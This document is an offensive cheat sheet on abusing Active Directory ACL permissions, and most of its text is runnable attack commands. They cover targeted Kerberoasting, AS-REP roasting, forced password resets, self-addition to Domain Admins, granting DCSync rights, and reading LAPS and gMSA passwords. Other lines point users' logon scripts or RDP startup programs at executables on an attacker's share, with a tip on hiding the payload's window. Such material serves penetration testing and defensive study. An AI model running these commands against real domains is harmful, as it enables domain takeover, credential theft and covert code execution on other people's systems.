# Active Directory - Access Controls ACL/ACE

An **Access Control Entry (ACE)** is a specific permission granted or denied to a user or group for a particular resource, such as a file or directory. Each ACE defines the type of access allowed (e.g., read, write, execute) or denied.

An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs) associated with a resource.    

* Check ACL for an User with [ADACLScanner](https://github.com/canix1/ADACLScanner).
	```ps1
	ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
	```

* Automate ACL exploit [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn):
	```ps1
	./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'
	```


## GenericAll/GenericWrite

### User/Computer

* We can set a **SPN** on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.
	* Windows/Linux
		```ps1
		# Check for interesting permissions on accounts:
		bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName'

		# Check if current user has already an SPN setted:
		bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get object <UserName> --attr serviceprincipalname

		# Force set the SPN on the account: Targeted Kerberoasting
		bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname -v 'ops/whatever1'

		# Grab the ticket
		GetUsersSPNs.py -dc-ip 10.10.10.10 'attack.lab/john.doe:Password123*' -request-user <UserName>

		# Remove the SPN
		bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname
		```
	* Windows only
		```ps1
		# Check for interesting permissions on accounts:
		Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

		# Check if current user has already an SPN setted:
		PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname

		# Force set the SPN on the account: Targeted Kerberoasting
		PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
		PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}

		# Grab the ticket
		PowerView2 > $User = Get-DomainUser username 
		PowerView2 > $User | Get-DomainSPNTicket | fl
		PowerView2 > $User | Select serviceprincipalname

		# Remove the SPN
		PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
		```

* We can change a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.
	* Windows/Linux:
		```ps1
		# Modify the userAccountControl
		$ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] add uac [Target_User] -f DONT_REQ_PREAUTH

		# Grab the ticket
		$ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

		# Set back the userAccountControl
		$ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] remove uac [Target_User] -f DONT_REQ_PREAUTH
		```
	* Windows only:
		```ps1
		# Modify the userAccountControl
		PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
		PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose

		# Grab the ticket
		PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
		ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username

		# Set back the userAccountControl
		PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
		PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
		```

* Reset another user's password.
	* Windows/Linux:
		```ps1			
		# Using bloodyAD with pass-the-hash
		bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password john.doe 'Password123!'
		```
	* Windows only:
		```ps1
		# https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
		$user = 'DOMAIN\user1'; 
		$pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
		$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
		$newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
		Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
		```
	* Linux only:
		```ps1
		# Using rpcclient from the  Samba software suite
		rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
		```

* WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : 
	* Windows/Linux:
		```ps1
		bloodyAD --host 10.0.0.5 -d example.lab -u attacker -p 'Password123*' set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.bat'
		```
	* Windows only:
		```ps1
		Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.bat"
		```

### Group

* This ACE allows us to add ourselves to the Domain Admin group : 
	* Windows/Linux:
		```ps1
		bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 add groupMember 'Domain Admins' hacker
		```
	* Windows only:
		```ps1
		net group "domain admins" hacker /add /domain
		```
	* Linux only:
		```ps1
		# Using the Samba software suite
		net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]
		```

### GenericWrite and Remote Connection Manager

> Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.
>  
> This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/

:warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (>2016), it requires a registry change to re-enable.
* Windows/Linux:
	```ps1
	bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
	bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSWorkDirectory -v 'C:\'
	```
* Windows only:
	```ps1
	$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
	$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
	$UserObject.TerminalServicesWorkDirectory = "C:\"
	$UserObject.SetInfo()
	```

NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.

## WriteDACL

To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights `Replicating Directory Changes/Replicating Directory Changes All`.

* WriteDACL on Domain:
	* Windows/Linux:
		```ps1
		# Give DCSync right to the principal identity
		bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B add dcsync user2
		
		# Remove right after DCSync
		bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B remove dcsync user2
		```
	* Windows only: 
		```ps1
		# Give DCSync right to the principal identity
		Import-Module .\PowerView.ps1
		$SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
		$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
		Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
		```
  
* WriteDACL on Group:
	* Windows/Linux:
		```ps1
		bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' add genericAll 'cn=INTERESTING_GROUP,dc=corp' devil_user1
		
		# Remove right
		bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' remove genericAll 'cn=INTERESTING_GROUP,dc=corp' devil_user1
		```
	* Windows only:
		```ps1
		# Using native command
		net group "INTERESTING_GROUP" User1 /add /domain
		# Or with external tool
		PowerSploit> Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1
		```

## WriteOwner

An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they wants. 
* Windows/Linux:
	```ps1
	bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' set owner target_object devil_user1
	```
* Windows only:
	```ps1
	Powerview> Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
	```

This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.

## ReadLAPSPassword

An attacker can read the LAPS password of the computer account this ACE applies to.
* Windows/Linux:
	```ps1
	bloodyAD -u john.doe -d bloody.lab -p Password512 --host 192.168.10.2 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
	```
* Windows only:
	```ps1
	Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
	```

## ReadGMSAPassword

An attacker can read the GMSA password of the account this ACE applies to.
* Windows/Linux:
	```ps1
	bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword
	```
* Windows only:
	```ps1
	# Save the blob to a variable
	$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'
	$mp = $gmsa.'msDS-ManagedPassword'

	# Decode the data structure using the DSInternals module
	ConvertFrom-ADManagedPasswordBlob $mp
	```

## ForceChangePassword

An attacker can change the password of the user this ACE applies to:
* Windows/Linux:
	```ps1
	# Using bloodyAD with pass-the-hash
	bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password target_user target_newpwd
	```
* Windows:
	```powershell
	$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
	Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
	```
* Linux:
	```ps1
	# Using rpcclient from the  Samba software suite
	rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
	```

## Organizational Units ACL

Access rights granted on Organizational Units can be exploited to compromise all the objects that are contained in it.

* [synacktiv/OUned](https://github.com/synacktiv/OUned) - The OUned project automating Active Directory Organizational Units ACL exploitation through gPLink poisoning


### Non privileged objects

A user having the `GenericAll` right (and thus `WriteDACL` permissions) over an OU could add a `FullControl` ACE to the OU and specify that this ACE should be inherited, which will effectively lead to the compromise of all child objects since they will inherit said ACE. 

* Grant `Full Control` on **SERVERS** OU
	```ps1
	dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'username' -target-dn 'OU=SERVERS,DC=lab,DC=local' 'lab.local'/'username':'Password1'
	```

*  Verify that we have `Full Control` ACL on **AD01-SRV1** inside **SERVERS**
	```ps1
	dacledit.py -action 'read' -principal 'username' -target-dn 'CN=AD01-SRV1,OU=SERVERS,DC=lab,DC=local' 'lab.local'/'username':'Password1'
	```

:warning: ACE inheritance from parent objects is disabled for `adminCount=1`


### Privileged objects

**Requirements**:

- `GenericWrite` OR `Manage Group Policy` links
- Create a machine account
- Add new DNS records


**Attack's Flow**: gPLink -> Attacker GPC FQDN -> GPT configuration files in Attacker SMB share -> execute a malicious scheduled task

* Edit the `gPLink` value to include a GPC FQDN pointing the attacker machine
* Create a fake LDAP server mimicking the real one, but with a custom GPC
* GPC's gPCFileSysPath value is pointing to the attacker SMB share
* The SMB share is serving GPT configuration files including a malicious scheduled task


**Exploit**:

Check this [blog post from Synacktiv](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory) to correctly setup all the requirements for this attack to succeeded.

```ps1
sudo python3 OUned.py --config config.ini
sudo python3 OUned.py --config config.example.ini --just-coerce
```


## References

* [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
* [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)
* [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
* [OU having a laugh? - Petros Koutroumpis - 6 November, 2019](https://labs.withsecure.com/publications/ou-having-a-laugh)
* [OUNED.PY: EXPLOITING HIDDEN ORGANIZATIONAL UNITS ACL ATTACK VECTORS IN ACTIVE DIRECTORY - Quentin Roland - 19/04/2024](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)